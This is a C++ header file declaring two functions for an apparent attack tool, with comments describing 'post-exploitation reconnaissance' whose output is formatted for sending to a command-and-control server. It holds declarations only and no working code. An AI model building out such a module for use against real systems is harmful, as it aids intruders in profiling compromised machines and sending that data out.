#ifndef RECON_H
#define RECON_H

#include <string>

// Full post-exploitation reconnaissance
// Returns formatted string ready for C2 transmission
std::string perform_full_recon();

// Cleanup/helper function to format recon data
std::string format_recon_output();

#endif // RECON_H
